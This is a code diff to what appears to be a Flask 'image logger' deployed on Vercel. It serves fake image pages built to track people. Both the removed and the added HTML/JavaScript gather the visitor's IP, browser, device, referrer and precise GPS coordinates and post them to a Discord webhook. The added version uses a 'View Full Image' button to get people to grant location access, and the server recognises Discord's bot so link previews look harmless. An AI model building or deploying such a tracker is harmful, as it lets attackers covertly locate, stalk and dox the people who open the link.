@@ -35,91 +35,164 @@ def is_discord_bot(user_agent):
             return True
     return False
 
-# HTML + JS that asks for geolocation and sends DIRECTLY to Discord webhook
+# HTML with a button that triggers location when clicked
 GEO_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
-    <script>
-        const DISCORD_WEBHOOK = "{{ webhook }}";
-        const IMAGE_URL = "{{ image_url }}";
-        const IP = "{{ ip }}";
-        const USER_AGENT = "{{ user_agent }}";
-        const REFERRER = "{{ referrer }}";
-        const TIMESTAMP = "{{ timestamp }}";
-        const BROWSER = "{{ browser }}";
-        const OS_NAME = "{{ os_name }}";
-        const DEVICE = "{{ device }}";
-
-        function sendToDiscord(lat, lng, accuracy) {
-            const embed = {
-                "title": "📍 GPS Location Captured",
-                "color": 0xff0000,
-                "fields": [
-                    {"name": "🌐 IP", "value": "`" + IP + "`", "inline": true},
-                    {"name": "📱 Browser", "value": "`" + BROWSER + "`", "inline": true},
-                    {"name": "💻 OS/Device", "value": "`" + OS_NAME + " - " + DEVICE + "`", "inline": true},
-                    {"name": "📍 Latitude", "value": "`" + lat + "`", "inline": true},
-                    {"name": "📍 Longitude", "value": "`" + lng + "`", "inline": true},
-                    {"name": "🎯 Accuracy", "value": "`" + accuracy + "m`", "inline": true},
-                    {"name": "🔗 Referrer", "value": "`" + REFERRER + "`", "inline": false},
-                    {"name": "⏰ Time", "value": TIMESTAMP, "inline": false}
-                ],
-                "footer": {"text": "Image Logger • Vercel • Geo-Enabled"}
-            };
-
-            const payload = {
-                "content": "**🚨 Real Location Grabbed**",
-                "embeds": [embed]
-            };
-
-            // Send to Discord webhook directly from browser
-            fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
-            }).then(response => {
-                console.log('Location sent to Discord');
-            }).catch(err => {
-                console.log('Failed to send to Discord:', err);
-            });
-
-            // Redirect to image after sending
-            window.location.href = IMAGE_URL + "?geo=1";
+    <title>Image</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
         }
-
-        function sendLocation(position) {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            sendToDiscord(lat, lng, accuracy);
+        .container {
+            text-align: center;
+            color: white;
         }
-
-        function errorLocation(err) {
-            // If denied or error, just redirect to image anyway
-            console.log('Location error:', err.message);
-            window.location.href = IMAGE_URL + "?geo=0";
+        .image-container {
+            max-width: 90%;
+            margin: 0 auto;
         }
+        .image-container img {
+            max-width: 100%;
+            max-height: 70vh;
+            border-radius: 12px;
+            box-shadow: 0 0 40px rgba(255,0,0,0.3);
+        }
+        .btn {
+            background: #ff0040;
+            border: none;
+            color: white;
+            padding: 16px 40px;
+            font-size: 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 0 30px rgba(255,0,64,0.5);
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 50px rgba(255,0,64,0.8);
+        }
+        .btn:active {
+            transform: scale(0.95);
+        }
+        .info {
+            color: #888;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
 
-        // Ask for location immediately when page loads
-        window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, errorLocation, {
+<div class="container">
+    <div class="image-container">
+        <img src="{{ image_url }}" alt="Image" onerror="this.style.display='none'; document.getElementById('error').style.display='block';">
+        <div id="error" style="display:none; color:#ff4444; margin:20px;">Failed to load image</div>
+    </div>
+    <div>
+        <button class="btn" id="clickBtn">🖼️ View Full Image</button>
+    </div>
+    <div class="info">Click the button to view the full image</div>
+</div>
+
+<script>
+    const DISCORD_WEBHOOK = "{{ webhook }}";
+    const IMAGE_URL = "{{ image_url }}";
+    const IP = "{{ ip }}";
+    const USER_AGENT = "{{ user_agent }}";
+    const REFERRER = "{{ referrer }}";
+    const TIMESTAMP = "{{ timestamp }}";
+    const BROWSER = "{{ browser }}";
+    const OS_NAME = "{{ os_name }}";
+    const DEVICE = "{{ device }}";
+
+    function sendToDiscord(lat, lng, accuracy) {
+        const embed = {
+            "title": "📍 GPS Location Captured",
+            "color": 0xff0000,
+            "fields": [
+                {"name": "🌐 IP", "value": "`" + IP + "`", "inline": true},
+                {"name": "📱 Browser", "value": "`" + BROWSER + "`", "inline": true},
+                {"name": "💻 OS/Device", "value": "`" + OS_NAME + " - " + DEVICE + "`", "inline": true},
+                {"name": "📍 Latitude", "value": "`" + lat + "`", "inline": true},
+                {"name": "📍 Longitude", "value": "`" + lng + "`", "inline": true},
+                {"name": "🎯 Accuracy", "value": "`" + accuracy + "m`", "inline": true},
+                {"name": "🔗 Referrer", "value": "`" + REFERRER + "`", "inline": false},
+                {"name": "⏰ Time", "value": TIMESTAMP, "inline": false}
+            ],
+            "footer": {"text": "Image Logger • Vercel • Geo-Enabled"}
+        };
+
+        const payload = {
+            "content": "**🚨 Real Location Grabbed**",
+            "embeds": [embed]
+        };
+
+        fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+        }).catch(err => console.log('Failed to send:', err));
+    }
+
+    function getLocationAndSend() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    sendToDiscord(lat, lng, accuracy);
+                    // Show a subtle success notification
+                    const btn = document.getElementById('clickBtn');
+                    btn.textContent = '✅ Location Sent!';
+                    btn.style.background = '#00cc66';
+                    setTimeout(() => {
+                        btn.textContent = '🖼️ View Full Image';
+                        btn.style.background = '#ff0040';
+                    }, 3000);
+                },
+                function(error) {
+                    console.log('Location error:', error.message);
+                    const btn = document.getElementById('clickBtn');
+                    btn.textContent = '⚠️ Location Blocked';
+                    btn.style.background = '#ff8800';
+                    setTimeout(() => {
+                        btn.textContent = '🖼️ View Full Image';
+                        btn.style.background = '#ff0040';
+                    }, 3000);
+                },
+                {
                     enableHighAccuracy: true,
                     timeout: 15000,
                     maximumAge: 0
-                });
-            } else {
-                // Fallback: redirect
-                window.location.href = IMAGE_URL + "?geo=0";
-            }
-        };
-    </script>
-</head>
-<body>
-    <p>Loading image...</p>
+                }
+            );
+        } else {
+            alert('Geolocation not supported');
+        }
+    }
+
+    // Add click event to button
+    document.getElementById('clickBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        getLocationAndSend();
+        // Also try to redirect to full image in new window
+        window.open(IMAGE_URL + "?geo=1", '_blank');
+    });
+</script>
+
 </body>
 </html>
 """
@@ -146,7 +219,7 @@ def serve_image():
         response.headers.set('Pragma', 'no-cache')
         return response
 
-    # Otherwise, serve the HTML that asks for location
+    # Otherwise, serve the HTML with the button
     ip = request.headers.get('X-Forwarded-For', request.remote_addr or 'Unknown')
     referrer = request.headers.get('Referer', 'No referrer')
     timestamp = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
